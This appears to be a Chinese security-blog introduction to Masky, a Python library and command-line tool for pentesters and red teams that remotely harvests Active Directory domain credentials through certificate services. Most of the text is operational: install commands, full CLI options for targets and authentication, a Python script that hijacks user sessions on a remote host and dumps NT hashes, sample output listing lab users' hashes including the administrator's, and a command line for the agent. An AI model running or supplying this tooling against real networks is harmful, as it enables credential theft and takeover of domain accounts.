![](https://image.3001.net/images/20220906/1662427589_6316a1c516b565b1468de.jpg!small)  

## 关于Masky

Masky是一个功能强大的Python库，Masky带有自己的命令行接口，可以允许广大研究人员在不需要转储LSASS进程内存数据的情况下，通过一个ADCS远程导出域用户凭证。

Masky还提供了一个命令行接口工具，可以帮助广大研究人员轻松地在更大范围内收集PFX、NT哈希和TGT数据。

该工具不会利用任何新的漏洞，也不会通过转储LSASS进程内存来工作。实际上，它只利用合法的Windows和活动目录功能（令牌模拟、通过kerberos的证书身份验证和通过PKINIT的NT哈希检索）。

## 工具安装

由于该工具基于Python 3开发，因此我们首先需要在本地设备上安装并配置好Python 3环境。接下来，广大研究人员使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Z4kSec/Masky.git

除此之外，我们也可以通过公共PyPi库来安装Masky：

    
    
    pip install masky

Masky代理的可执行程序已经包含在PyPi包内了。

如果你需要修改代理的话，可以使用Visual Studio打开agent/Masky.sln，修改代码后重新编译即可，此时还需要安装好.NET
Framework 4。

## 工具使用

Masky提供了一个命令行接口，以便广大渗透测试人员和红队研究人员在活动中使用。

针对这两种使用场景，我们首先需要检索CA服务器的FQDN及其通过ADC部署的CA名称。这部分信息可以通过certipy查找选项或Microsoft内置的certutil.exe工具轻松检索，不过需要确保在目标CA上启用了默认User模板。

### 命令行接口使用

下列工具演示样例中演示了Masky的基础使用，样例中针对了四个远程系统执行了测试，并从sec.lab测试域收集了三个不同域用户的NT哈希、CCACHE和PFX信息：

![](https://image.3001.net/images/20220906/1662427639_6316a1f734a4585cd1d1b.gif)

Masky还提供了其他工具运行选项：

    
    
    __  __           _
    
     |  \/  | __ _ ___| | ___   _
    
     | |\/| |/ _` / __| |/ / | | |
    
     | |  | | (_| \__ \   <| |_| |
    
     |_|  |_|\__,_|___/_|\_\__,  |
    
      v0.0.3                 |___/
    
     
    
    usage: Masky [-h] [-v] [-ts] [-t THREADS] [-d DOMAIN] [-u USER] [-p PASSWORD] [-k] [-H HASHES] [-dc-ip ip address] -ca CERTIFICATE_AUTHORITY [-nh] [-nt] [-np] [-o OUTPUT]
    
                 [targets ...]
    
     
    
    positional arguments:
    
      targets               测试目标，支持CIDR、主机名和IP格式
    
     
    
    options:
    
      -h, --help            显示工具帮助信息和退出
    
      -v, --verbose         启用调试信息
    
      -ts, --timestamps     显示每个日志的时间戳
    
      -t THREADS, --threads THREADS
    
                           线程池大小（最大15）
    
     
    
    Authentication:
    
      -d DOMAIN, --domain DOMAIN
    
                            目标认证域名
    
      -u USER, --user USER  目标认证用户名
    
      -p PASSWORD, --password PASSWORD
    
                            目标认证密码
    
      -k, --kerberos         使用Kerberos认证，基于目标参数从ccache文件获取凭证.
    
      -H HASHES, --hashes HASHES
    
                            目标认证哈希（LM:NT, :NT或:LM）
    
     
    
    Connection:
    
      -dc-ip ip address     域控制器IP地址r
    
      -ca CERTIFICATE_AUTHORITY, --certificate-authority CERTIFICATE_AUTHORITY
    
                           证书机构名称  (SERVER\CA_NAME)
    
     
    
    Results:
    
      -nh, --no-hash        不请求NT哈希
    
      -nt, --no-ccache      不存储ccache文件
    
      -np, --no-pfx         不存储pfx文件
    
      -o OUTPUT, --output OUTPUT
    
                           Masky存储结果的本地目录路径 

### Python库使用

下面的脚本使用了Masky库来从远程目标收集正在运行的域用户会话信息：

    
    
    from masky import Masky
    
    from getpass import getpass
    
     
    
     
    
    def dump_nt_hashes():
    
        # Define the authentication parameters
    
        ca = "srv-01.sec.lab\sec-SRV-01-CA"
    
        dc_ip = "192.168.23.148"
    
        domain = "sec.lab"
    
        user = "askywalker"
    
        password = getpass()
    
     
    
        # Create a Masky instance with these credentials
    
        m = Masky(ca=ca, user=user, dc_ip=dc_ip, domain=domain, password=password)
    
     
    
        # Set a target and run Masky against it
    
        target = "192.168.23.130"
    
        rslts = m.run(target)
    
     
    
        # Check if Masky succesfully hijacked at least a user session
    
        # or if an unexpected error occured
    
        if not rslts:
    
            return False
    
     
    
        # Loop on MaskyResult object to display hijacked users and to retreive their NT hashes
    
        print(f"Results from hostname: {rslts.hostname}")
    
        for user in rslts.users:
    
            print(f"\t - {user.domain}\{user.name} - {user.nt_hash}")
    
     
    
        return True
    
     
    
     
    
    if __name__ == "__main__":
    
    dump_nt_hashes()

 **收集到的输出数据如下** ：

    
    
    $> python3 .\masky_demo.py
    
    Password:
    
    Results from hostname: SRV-01
    
             - sec\hsolo - 05ff4b2d523bc5c21e195e9851e2b157
    
             - sec\askywalker - 8928e0723012a8471c0084149c4e23b1
    
             - sec\administrator - 4f1c6b554bb79e2ce91e012ffbe6988a

### Masky代理使用

    
    
    $> .\Masky.exe /ca:'CA SERVER\CA NAME' (/template:User) (/currentUser) (/output:./output.txt) (/debug:./debug.txt)

![](https://image.3001.net/images/20220906/1662427700_6316a234b26597ecf8a5f.png!small)

## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/Z4kSec/Masky/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **Masky** ：【[ _GitHub传送门_](https://github.com/Z4kSec/Masky)】

## 参考资料

> [ _https://z4ksec.github.io/posts/masky-> release-v0.0.3/_](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
>
> [
> _https://github.com/GhostPack/Certify_](https://github.com/GhostPack/Certify)
>
> [ _https://github.com/ly4k/Certipy_](https://github.com/ly4k/Certipy)
>
> [ _https://medium.com/@oliverlyak_](https://medium.com/@oliverlyak)
>
> [ _https://dirkjanm.io/ntlm-relaying-to-ad-certificate-> services/_](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
>
> [
> _https://github.com/SecureAuthCorp/impacket_](https://github.com/SecureAuthCorp/impacket)
>
> [ _https://github.com/Hackndo/Lsassy_](https://github.com/Hackndo/Lsassy)
>
> [ _https://github.com/rapid7/metasploit-> payloads/blob/master/c/meterpreter/source/extensions/incognito/_](https://github.com/rapid7/metasploit-> payloads/blob/master/c/meterpreter/source/extensions/incognito/)
>
> [
> _https://github.com/S3cur3Th1sSh1t/SharpImpersonation_](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)
>
> [ _https://s3cur3th1ssh1t.github.io/SharpImpersonation-> Introduction/_](https://s3cur3th1ssh1t.github.io/SharpImpersonation-> Introduction/)
>
> [ _https://www.mcafee.com/enterprise/en-us/assets/reports/rp-access-token-> theft-manipulation-attacks.pdf_](https://www.mcafee.com/enterprise/en-> us/assets/reports/rp-access-token-theft-manipulation-attacks.pdf)

